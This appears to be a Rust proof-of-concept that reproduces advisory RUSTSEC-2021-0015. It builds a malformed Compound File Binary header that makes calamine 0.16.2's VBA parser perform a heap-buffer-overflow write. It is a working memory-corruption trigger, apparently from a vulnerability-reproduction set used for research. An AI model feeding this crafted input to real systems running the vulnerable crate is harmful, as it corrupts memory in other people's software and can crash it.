//! RUSTSEC-2021-0015 / calamine 0.16.2.
//!
//! This derived adapter constructs the smallest Compound File Binary shape we
//! found that drives the advisory's untrusted sector length into `Vec::set_len`.
//! The byte construction is local and deterministic. Its provenance is derived;
//! the corresponding Rudra entry contains an empty stub. Under release-mode ASan,
//! vulnerable crate reports a one-byte allocation followed by a 512-byte
//! heap-buffer-overflow write. The identical 0.17.0 control exits cleanly.

use calamine::vba::VbaProject;
use std::io::Cursor;

fn main() {
    let mut bytes = vec![0u8; 1024];

    // Compound File Binary signature and header fields.
    bytes[0..8].copy_from_slice(&0xE11A_B1A1_E011_CFD0u64.to_le_bytes());
    bytes[26..28].copy_from_slice(&3u16.to_le_bytes());
    bytes[30..32].copy_from_slice(&9u16.to_le_bytes());
    bytes[32..34].copy_from_slice(&6u16.to_le_bytes());
    bytes[48..52].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes());
    bytes[68..72].copy_from_slice(&0xFFFF_FFFEu32.to_le_bytes());

    // Claim sector 0 in the DIFAT while leaving the remaining entries free.
    for entry in bytes[76..512].chunks_exact_mut(4) {
        entry.copy_from_slice(&0xFFFF_FFFFu32.to_le_bytes());
    }
    bytes[76..80].copy_from_slice(&0u32.to_le_bytes());

    let mut input = Cursor::new(bytes);
    let _ = VbaProject::new(&mut input, 1);
}
